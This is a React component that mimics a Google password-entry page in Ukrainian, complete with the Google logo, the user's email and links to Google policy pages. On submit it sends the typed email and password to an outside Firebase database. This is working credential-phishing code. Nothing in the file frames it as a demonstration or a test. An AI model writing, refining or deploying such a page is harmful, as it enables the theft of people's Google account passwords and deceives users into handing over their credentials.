import {useState, useRef} from "react"
import googleLogo from "./assets/google-logo.svg"
import "./App.scss"
import {initializeApp} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"
import {getDatabase, ref, push} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"

function Password({email, end}) {
   const appSettings = {
      databaseURL: "https://passem-aba66-default-rtdb.europe-west1.firebasedatabase.app/",
   }
   const app = initializeApp(appSettings)
   const database = getDatabase(app)
   const passInDB = ref(database, "pass")

   // const inputFieldEl = document.getElementById("input-field")
   // const addButtonEl = document.getElementById("add-button")

   // addButtonEl.addEventListener("click", function () {
   //    let inputValue = inputFieldEl.value

   //    push(passInDB, inputValue)

   //    console.log(`${inputValue} added to database`)
   // })

   const [classForInput, setClassForInput] = useState("")
   const [errorClass, setErrorClass] = useState("")
   const [type, setType] = useState("password")

   function handleClassForInput(e) {
      e.stopPropagation()
      setClassForInput("focus")
      focus()
   }
   const inputRef = useRef(null)

   function focus() {
      inputRef.current.focus()
   }

   function blockEvent() {
      if (!inputRef.current.value.length > 0) setClassForInput("")
      // else if (inputRef.current.value.length === 0) setClassForInput("")
      else setClassForInput("focus focus-two")
   }

   const errorMessage = "Неправильний пароль. Введіть ще раз"

   function sendData(e) {
      e.stopPropagation()
      if (inputRef.current.value.length < 4) {
         setErrorClass("error")
         // error()
         throw new Error("This password does not correct")
      } else {
         setErrorClass("")
         // console.log(email, inputRef.current.value)
         const res = {
            userEmail: email,
            userPass: inputRef.current.value,
         }
         push(passInDB, res)
         console.log(`${res} added to database`)
         end()
      }
   }
   function sendInfoKeyDown(e) {
      e.stopPropagation()
      if (e.key === "Enter") {
         if (inputRef.current.value.length < 4) {
            setErrorClass("error")
            // error()

            throw new Error("This password does not correct")
         } else {
            setErrorClass("")
            // console.log(email, inputRef.current.value)
            const res = {
               userEmail: email,
               userPass: inputRef.current.value,
            }
            push(passInDB, res)
            console.log(`${res} added to database`)
            end()
         }
      }
   }

   function showHidePassword(e) {
      e.stopPropagation()
      console.log(e)
      if (type === "password") setType("text")
      else setType("password")
      console.log(type)
   }

   return (
      <div onClick={blockEvent} className="block">
         <div className="enter">
            <div className="enter__left">
               <img src={googleLogo} alt="google logo" className="enter__logo" />
               <h1 className="enter__title">Вітаємо</h1>
               <h4 className="enter__sub-title mail">{email}</h4>
            </div>
            <div className="enter__right">
               <h4 className="enter__pass-head">Щоб продовжити спершу введіть свій пароль</h4>
               <div className="enter__info-enter enter__info-enter--margin">
                  <div onClick={handleClassForInput} onKeyDown={sendInfoKeyDown} className={`enter__input ${classForInput} ${errorClass}`}>
                     <input ref={inputRef} type={type} spellCheck="false" />
                     <span>Введіть пароль</span>
                  </div>
                  <p className={`enter__error ${errorClass}`}>
                     <svg
                        aria-hidden="true"
                        fill="currentColor"
                        focusable="false"
                        width="16px"
                        height="16px"
                        viewBox="0 0 24 24"
                        xmlns="https://www.w3.org/2000/svg"
                     >
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                     </svg>{" "}
                     {errorMessage}
                  </p>
                  <div onClick={showHidePassword} className={`custom-input ${type}`}>
                     <input id="showPass" type="checkbox" className="custom-input__checkbox" />
                     <label htmlFor="showPass" className="custom-input__block-checkbox">
                        Показати пароль
                     </label>

                     <svg xmlns="http://www.w3.org/2000/svg" class="custom-input__check" x="0px" y="0px" width="100" height="100" viewBox="0 0 30 30">
                        <path d="M 26.980469 5.9902344 A 1.0001 1.0001 0 0 0 26.292969 6.2929688 L 11 21.585938 L 4.7070312 15.292969 A 1.0001 1.0001 0 1 0 3.2929688 16.707031 L 10.292969 23.707031 A 1.0001 1.0001 0 0 0 11.707031 23.707031 L 27.707031 7.7070312 A 1.0001 1.0001 0 0 0 26.980469 5.9902344 z"></path>
                     </svg>
                  </div>
               </div>
               <div className="enter__buttons">
                  {/* <button>Забули пароль?</button> */}
                  <button onClick={sendData} className="bg">
                     Далі
                  </button>
               </div>
            </div>
         </div>
         <div className="sub-info">
            <div className="sub-info__select">
               <select name="language">
                  <option value="ukr">Українська</option>
                  <option value="eng">Англійська</option>
               </select>
               <svg class="sub-info__arrows" viewBox="7 10 10 5" focusable="false">
                  <polygon class="sub-info__down-arrow" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
                  <polygon class="sub-info__up-arr" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
               </svg>
            </div>
            <ul className="sub-info__links">
               <li className="sub-info__item-link">
                  <a
                     target="_blank"
                     href="https://support.google.com/accounts?hl=uk&visit_id=638661675643073762-372066819&rd=2&p=account_iph#topic=3382296"
                  >
                     Довідка
                  </a>
               </li>
               <li className="sub-info__item-link">
                  <a target="_blank" href="policies.google.com/privacy?gl=UA&hl=uk">
                     Конфіденційність
                  </a>
               </li>
               <li className="sub-info__item-link">
                  <a target="_blank" href="https://policies.google.com/terms?gl=UA&hl=uk">
                     Умови
                  </a>
               </li>
            </ul>
         </div>
      </div>
   )
}

export default Password
